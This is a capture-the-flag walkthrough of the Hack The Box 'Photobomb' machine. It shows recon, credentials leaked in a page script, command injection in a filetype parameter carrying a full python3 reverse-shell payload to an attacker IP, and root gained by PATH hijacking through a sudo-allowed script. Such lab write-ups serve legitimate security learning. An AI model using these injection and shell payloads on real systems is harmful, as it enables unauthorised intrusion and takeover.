---
cover: ../../../../.gitbook/assets/Photobomb.png
coverY: 250.98666666666665
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Photobomb

I scan the remote host ...

```sh
nmap -sV -sC -v -p- 10.10.11.182
```

... and I get this result :&#x20;

<figure><img src="../../../../.gitbook/assets/photobomb-nmap.png" alt=""><figcaption></figcaption></figure>

There is a web service running on `port 80` with `nginx/1.18.0` and the operating system is `Ubuntu`. I add the Local DNS Name :

```sh
echo '10.10.11.182 photobomb.htb' | tee -a /etc/hosts
```

I try to enumerate website :

```sh
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://photobomb.htb
```

I get one subdirectory :

<figure><img src="../../../../.gitbook/assets/photobomb-gobuster.png" alt=""><figcaption></figcaption></figure>

When I load this page, it asks me a login and a password. If I inspect the web page, I can see there is a script running on :&#x20;

<figure><img src="../../../../.gitbook/assets/photobomb-find-script.png" alt=""><figcaption></figcaption></figure>

In this script, there are some clear credentials :&#x20;

<figure><img src="../../../../.gitbook/assets/photobomb-find-script-password.png" alt=""><figcaption></figcaption></figure>

I check the url `http://pH0t0:b0Mb!@photobomb.htb/printer`. I can download images, I open BurpSuite and grab the request, I can see there are 3 parameters :

```
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Origin: http://photobomb.htb
DNT: 1
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```

I want inject some code to ping the local host from remote, thus I start a ICMP listener on the local host ...

```sh
tcpdump -i tun0
```

... then I modify the filetype parameter like this :

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;ping+-c+3+10.10.14.9&dimensions=3000x2000
```

I receive ICMP requests on the local host :&#x20;

<figure><img src="../../../../.gitbook/assets/photobomb-icmp.png" alt=""><figcaption></figcaption></figure>

I start a netcat listener to host the remote shell :

```sh
nc -lnvp 8888
```

I try to inject a reverse shell payload in the `filetype` parameter. The payload is :

```sh
export RHOST="10.10.14.17";
export RPORT=8888;

python3 -c 'import sys, socket, os, pty; s=socket.socket(); s.connect((os.getenv("RHOST"), int(os.getenv("RPORT")))); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn("sh")'
```

And I insert it into the request :

```
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Origin: http://photobomb.htb
DNT: 1
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;export+RHOST="10.10.14.17";export+RPORT=8888;python3+-c+'import+sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd)+for+fd+in(0,1,2)];pty.spawn("sh")'&dimensions=3000x2000
```

When I send this request, I gain reverse shell on netcat :

```sh
cat /home/wizard/user.txt
```

Upgrade the shell :

```sh
python3 -c "import pty;pty.spawn('/bin/bash')"
```

I check sudo permissions with `sudo -l` :&#x20;

<figure><img src="../../../../.gitbook/assets/photobomb-sudo-permissions.png" alt=""><figcaption></figcaption></figure>

This file executes `/opt/.bashrc` :&#x20;

<figure><img src="../../../../.gitbook/assets/photobomb-cleanup-content.png" alt=""><figcaption></figcaption></figure>

Look at the difference between original `.bashrc` and actual `.bashrc` :

```bash
diff /etc/bash.bashrc /opt/.bashrc
```

There is one interesting difference, `enable -n [ # ]` because it enables all file for the current PATH. I have to update the PATH to include a new file which executes a `/bin/bash` as root.

<figure><img src="../../../../.gitbook/assets/photobomb-diff-bashrc.png" alt=""><figcaption></figcaption></figure>

I execute these commands :

```sh
echo '/bin/bash' | tee /tmp/[
chmod +x /tmp/[
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

I gain root privilege :

```sh
cat /root/root.txt
```
